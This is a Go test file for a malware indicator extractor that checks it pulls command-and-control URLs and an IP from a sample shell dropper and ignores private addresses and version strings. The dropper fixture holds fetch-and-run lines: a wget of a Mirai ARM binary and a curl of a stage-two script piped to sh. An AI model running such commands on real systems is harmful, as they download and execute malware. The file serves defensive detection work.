package artefacto

import "testing"

func TestIndicadoresExtraeC2DeDropper(t *testing.T) {
	dropper := []byte("#!/bin/sh\n" +
		"wget http://185.7.9.3/bins/mirai.arm7 -O /tmp/.x\n" +
		"curl http://malware.example.com:8080/stage2 | sh\n" +
		"connect 45.133.1.7\n")
	ind := IndicadoresDe(dropper)
	tieneURL := func(u string) bool {
		for _, x := range ind.URLs {
			if x == u {
				return true
			}
		}
		return false
	}
	if !tieneURL("http://185.7.9.3/bins/mirai.arm7") || !tieneURL("http://malware.example.com:8080/stage2") {
		t.Fatalf("no extrajo las URLs de C2: %+v", ind.URLs)
	}
	tieneIP := false
	for _, ip := range ind.IPs {
		if ip == "45.133.1.7" {
			tieneIP = true
		}
	}
	if !tieneIP {
		t.Fatalf("no extrajo la IP de C2: %+v", ind.IPs)
	}
}

func TestIndicadoresFiltraRuido(t *testing.T) {
	// Versiones y direcciones privadas/reservadas no son IOCs.
	ind := IndicadoresDe([]byte("GLIBC_2.2.5 built 10.0.0.1 lan 192.168.1.1 lo 127.0.0.1 ver 8.0.36 mask 255.255.255.0"))
	if len(ind.IPs) != 0 {
		t.Fatalf("capturo ruido como IP: %+v", ind.IPs)
	}
}
